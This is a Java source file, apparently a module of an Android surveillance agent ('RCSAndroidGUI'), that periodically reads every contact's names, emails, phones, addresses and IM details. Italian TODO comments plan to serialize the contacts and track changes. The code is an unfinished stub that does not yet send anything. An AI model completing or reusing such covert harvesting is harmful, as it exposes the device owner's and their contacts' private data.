package com.ht.RCSAndroidGUI.agent;

import java.util.List;
import java.util.ListIterator;

import com.ht.RCSAndroidGUI.agent.task.Contact;
import com.ht.RCSAndroidGUI.agent.task.EmailInfo;
import com.ht.RCSAndroidGUI.agent.task.ImInfo;
import com.ht.RCSAndroidGUI.agent.task.OrganizationInfo;
import com.ht.RCSAndroidGUI.agent.task.PhoneInfo;
import com.ht.RCSAndroidGUI.agent.task.PickContact;
import com.ht.RCSAndroidGUI.agent.task.PostalAddressInfo;
import com.ht.RCSAndroidGUI.agent.task.UserInfo;
import com.ht.RCSAndroidGUI.agent.task.WebsiteInfo;

public class AgentTask extends AgentBase {
	private static final String TAG = "AgentAddressbook";
	private PickContact contact;
	
	public AgentTask() {

	}
	
	@Override
	public boolean parse(AgentConf conf) {
		return true;
	}
	
	@Override
	public void begin() {
		setPeriod(180 * 60 * 1000);
		setDelay(200);
	}
	
	@Override
	public void go() {
		contact = new PickContact();
		
		List<Contact> list = contact.getContactInfo();

		// TODO Serializzare i contatti
		// Vedere se ce ne sono di nuovi o se le info
		// gia' presenti sono cambiate
		// Email Info
		ListIterator<Contact> iter = list.listIterator();
		
		while (iter.hasNext()) {
			Contact c = iter.next();
			UserInfo user = c.getUserInfo();
			List<EmailInfo> email = c.getEmailInfo();
			List<PostalAddressInfo> paInfo = c.getPaInfo();
			List<PhoneInfo> phoneInfo = c.getPhoneInfo();
			List<ImInfo> imInfo = c.getImInfo();
			List<OrganizationInfo> orgInfo = c.getOrgInfo();
			List<WebsiteInfo> webInfo = c.getWebInfo();
			
			long id = user.getUserId();
			String name = user.getCompleteName();
			
			ListIterator<EmailInfo> eiter = email.listIterator();
			
			while (eiter.hasNext()) {
				EmailInfo einfo = eiter.next();
				
				einfo.getClass(); // Etc...
			}
			
			// Ripetere per tutte le altre liste descritte qui sopra
		}
	}
	
	@Override
	public void end() {

	}
}
